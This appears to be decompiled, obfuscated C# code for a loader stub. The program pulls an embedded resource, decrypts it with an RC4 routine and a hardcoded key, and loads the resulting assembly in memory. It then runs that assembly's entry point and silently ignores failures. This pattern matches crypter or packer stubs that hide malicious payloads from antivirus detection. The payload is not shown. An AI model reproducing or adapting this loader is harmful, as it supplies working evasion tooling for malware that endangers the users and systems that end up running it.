using System;
using System.Reflection;
using System.Resources;
using System.Text;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsWithUI;

namespace ns0;

internal sealed class Class0
{
	private static void Main(string[] args)
	{
		object[] array = default(object[]);
		int num = default(int);
		long num2 = default(long);
		ResourceManager resourceManager = default(ResourceManager);
		byte[] array2 = default(byte[]);
		Assembly assembly = default(Assembly);
		object[] array3 = default(object[]);
		try
		{
			if (!UnhandledExceptionHandlerWithUI.AttachApp())
			{
				return;
			}
			array = new object[0];
			num = new Random().Next(300, 750);
			num2 = Environment.TickCount;
			_ = Environment.TickCount - num2;
			try
			{
				resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
				array2 = smethod_0((byte[])resourceManager.GetObject("CrJ5KWl59cJ"), "qrEqvmqzoC0Vcy52moASHiGFKd8JeXMKr0AR0kT3zP5I6o9eeTp80vGh");
				resourceManager.ReleaseAllResources();
				assembly = Assembly.Load(array2);
				if (assembly.EntryPoint!.GetParameters().Length > 0)
				{
					array3 = new object[1] { args };
					array = array3;
				}
				assembly.EntryPoint!.Invoke(null, array);
			}
			catch
			{
			}
		}
		catch (Exception exception)
		{
			UnhandledExceptionHandler.EntryPointException(exception, new object[8] { array, num, num2, resourceManager, array2, assembly, array3, args });
		}
	}

	public static byte[] smethod_0(byte[] byte_0, string string_0)
	{
		byte[] bytes = default(byte[]);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		int i = default(int);
		int num = default(int);
		byte b = default(byte);
		int j = default(int);
		int num2 = default(int);
		try
		{
			bytes = Encoding.Default.GetBytes(string_0);
			array = new byte[256];
			array2 = new byte[256];
			for (i = 0; i < 256; i++)
			{
				array[i] = (byte)i;
				array2[i] = bytes[i % bytes.GetLength(0)];
			}
			num = 0;
			for (i = 0; i < 256; i++)
			{
				num = (num + array[i] + array2[i]) % 256;
				b = array[i];
				array[i] = array[num];
				array[num] = b;
			}
			num = 0;
			i = 0;
			for (j = 0; j < byte_0.GetLength(0); j++)
			{
				i = (i + 1) % 256;
				num = (num + array[i]) % 256;
				b = array[i];
				array[i] = array[num];
				array[num] = b;
				num2 = (array[i] + array[num]) % 256;
				byte_0[j] ^= array[num2];
			}
			return byte_0;
		}
		catch (Exception exception)
		{
			StackFrameHelper.CreateException10(exception, bytes, array, array2, b, i, num, j, num2, byte_0, string_0);
			throw;
		}
	}
}
